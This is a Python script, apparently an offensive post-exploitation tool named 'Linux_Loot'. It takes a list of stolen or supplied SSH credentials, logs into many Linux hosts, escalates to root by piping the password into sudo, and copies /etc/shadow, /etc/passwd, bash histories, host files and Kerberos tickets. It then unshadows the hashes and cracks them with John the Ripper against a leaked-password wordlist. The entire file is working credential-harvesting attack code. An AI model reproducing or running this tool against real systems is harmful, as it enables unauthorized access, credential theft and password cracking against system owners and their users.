import os
import argparse
import paramiko as paramiko
from psycopg2 import Error
import subprocess
from collections import OrderedDict
import colorama
import pathlib


class Linux_Loot:
    def __init__(self):
        self.targets = None
        self.opt = None
        colorama.init(autoreset=True)

    # Getting arguments from command line
    @staticmethod
    def get_args():
        parser = argparse.ArgumentParser("This script collects juicy loot from remote linux machines")
        parser.add_argument("-f", "--file",
                            help="file with space separated credentials: <username> <password> <ip> [<port>]",
                            required=True)

        # privilege escalation
        parser.add_argument("-p", "--privesc", help="privesc method: ss - sudo su; <??> - ??", default='ss')
        parser.add_argument("-b", "--brute", default=False)
        return parser.parse_args()

    # Establish connection with single host
    def ssh_connect(self, host, user, pas, port):
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

        try:
            ssh.connect(hostname=host, username=user, password=pas, port=port)
            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + f"[*] Connection established")
            return ssh

        except:
            print(colorama.Fore.RED + colorama.Style.BRIGHT + f"[!] Could not establish connection with {host}:{port}")
            return False

    # Kill the connection
    def ssh_disconnect(self, con):
        con.close()

    # Execute sigle commad + escalation payload
    def ssh_exec(self, con, privesc, command):
        payload = privesc + command

        stdin, stdout, stderr = con.exec_command(payload)
        return stdout.read().decode()

    # Parse input file content
    def parse_list(self):
        params = open(self.opt.file, 'r')
        targets = []
        for line in params:
            if line != '\n':
                targets.append(line.rstrip().split(' '))
        return targets

    # Select priv escalation payload (for future modifications)
    def privesc_methods(self, pas):
        if self.opt.privesc == 'ss':
            return f' echo {pas} | sudo -S '
        else:
            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + '[*] No such privesc method')
            return 1

    # Write dump about single host into file
    def loot_write(self, ip, name, data):
        os.makedirs(f"./Linux_Loot/{ip}", exist_ok=True)
        file = open(f'./Linux_Loot/{ip}/{name}', 'w')
        file.write(data)
        file.close()

    # Writing all hashes to a separate directory and sorting (for future modifications)
    def hashes_write(self, data):
        os.makedirs(f'./Linux_Loot/All_hashes', exist_ok=True)
        for h in data:
            if h.split('$')[1] == 'y':
                file = open(f'./Linux_Loot/All_hashes/$y$', 'a')
                file.write(h + '\n')
                file.close()
            elif h.split('$')[1] == '1':
                file = open(f'./Linux_Loot/All_hashes/$1$', 'a')
                file.write(h + '\n')
                file.close()
            elif h.split('$')[1] == '5':
                file = open(f'./Linux_Loot/All_hashes/$5$', 'a')
                file.write(h + '\n')
                file.close()
            elif h.split('$')[1] == '6':
                file = open(f'./Linux_Loot/All_hashes/$6$', 'a')
                file.write(h + '\n')
                file.close()
            else:
                file = open(f'./Linux_Loot/All_hashes/others', 'a')
                file.write(h + '\n')
                file.close()

    # Records the compliance of the user's hash and password
    def password_write(self, file, user_pass):
        path = pathlib.Path(f'./Linux_Loot/All_hashes/{file}')
        for user_hash in path.read_text().split():
            username = user_hash.split(':')[0]
            if username == user_pass.split(':')[0]:
                path.write_text(path.read_text().replace(user_hash, f'{user_hash}:{user_pass.split(":")[1]}'))

    # Collect loot from single host
    def collect_loot(self, target):
        try:
            # Establish connection with server
            if len(target) == 4:
                ssh = self.ssh_connect(target[2], target[0], target[1], target[3])
                print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:{target[3]}')
            else:
                ssh = self.ssh_connect(target[2], target[0], target[1], '22')
                print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:22')

            # Break if connection wasn't established
            if not ssh:
                return False

            # Execute command
            pe = self.privesc_methods(target[1])

            loot_file_list = ['tail -n +1 /etc/passwd', 'tail -n +1 /etc/shadow', 'tail -n +1 /root/.bash_history',
                              'tail -n +1 /home/*/.bash_history', 'tail -n +1 /etc/hosts',
                              'tail -n +1 /etc/resolv.conf', 'klist']
            for command in loot_file_list:
                # Write loot to the file
                self.loot_write(target[2],
                                command.split()[-1][1:].replace("/", "_")
                                if command.split()[-1] != 'klist' else 'klist',
                                self.ssh_exec(ssh, pe, command))

            # Close connection
            self.ssh_disconnect(ssh)
            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n[+] Success!")

        except (Exception, Error) as error:
            print(colorama.Fore.RED + colorama.Style.BRIGHT + "[!] Operation failed: ", error)

    # Getting users and their hashes
    def unshadow(self):
        user_hash = ''
        for target in self.targets:
            unsh = subprocess.run(
                ['unshadow', f'./Linux_Loot/{target[2]}/etc_passwd', f'./Linux_Loot/{target[2]}/etc_shadow'],
                stdout=subprocess.PIPE, text=True)

            for output in unsh.stdout.replace(' ', '_').split():
                if output.split(':')[1].find('!') == -1 and output.split(':')[1].find('*') == -1:
                    user_hash += ':'.join(output.split(':')[0:2]) + '\n'
        self.hashes_write(list(OrderedDict.fromkeys(user_hash.split())))

    # Brute force hashes
    def brute_force(self):
        # Launching john (editable wordlist: '--wordlist=/usr/share/seclists/Passwords/500-worst-passwords.txt')
        stdout = subprocess.run(['ls', './Linux_Loot/All_hashes'], stdout=subprocess.PIPE, text=True)
        files = stdout.stdout

        for file in files.split():
            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + f'[*] ./Linux_Loot/All_hashes/{file}')
            john = subprocess.Popen(['john', '--wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt',
                                     f'./Linux_Loot/All_hashes/{file}'], stdout=subprocess.PIPE, text=True)
            john.wait()

            john = subprocess.Popen(['john', '--show',
                                     f'./Linux_Loot/All_hashes/{file}'], stdout=subprocess.PIPE, text=True)
            john.wait()
            stdout, stderr = john.communicate()
            if stdout.find('0 password hashes cracked') == -1:
                [self.password_write(file, user_pass) for user_pass in stdout.split('\n')[:-3]]
                print(colorama.Fore.GREEN + '[+] Password found!')
            else:
                print(colorama.Fore.RED + '[-] No passwords found!')

        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n[+] Success!")

    # Try to collect loot from all given hosts
    def loot_all_hosts(self):
        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + '+----------------------TARGETS-----------------------+')
        self.targets = self.parse_list()
        for target in self.targets:
            self.collect_loot(target)
        self.unshadow()

        if self.opt.brute:
            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + '+-----------------------BRUTE------------------------+')
            self.brute_force()

        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "+----------------------------------------------------+")

    def main(self):
        self.opt = Linux_Loot.get_args()
        self.loot_all_hosts()


if __name__ == "__main__":
    loot = Linux_Loot()
    loot.main()
